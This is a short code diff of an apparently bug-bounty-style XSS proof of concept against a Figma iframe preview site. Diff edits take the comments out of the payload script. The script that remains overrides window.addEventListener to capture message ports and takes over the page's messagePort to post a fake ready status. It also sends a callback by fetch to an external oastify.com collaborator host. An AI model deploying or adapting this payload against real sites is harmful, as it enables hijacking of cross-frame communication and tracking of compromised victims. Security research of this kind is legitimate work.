@@ -1,8 +1,5 @@
 <script>
-● // Proof of execution
   alert('XSS on figmaiframepreview.figma.site - payload loaded!')
-
-  // Override addEventListener to catch next iframe-init and grab both ports
   const _origAEL = window.addEventListener.bind(window)
   window.addEventListener = function(type, handler, ...args) {
     if (type === 'message') {
@@ -21,8 +18,6 @@
       _origAEL(type, handler, ...args)
     }
   }
-
-  // Grab current port0
   window._port0 = window.messagePort
   if (window.messagePort) {
     window.messagePort.onmessage = (e) => {
@@ -32,7 +27,5 @@
     window.messagePort.postMessage({data: {method: 'status', state: 'ready', isReady: true}})
   }
   fetch('https://wllni5hagz8cmclexn8ssq8lscy3mtai.oastify.com/alive?t=' + Date.now())
-
-
   </script>
 
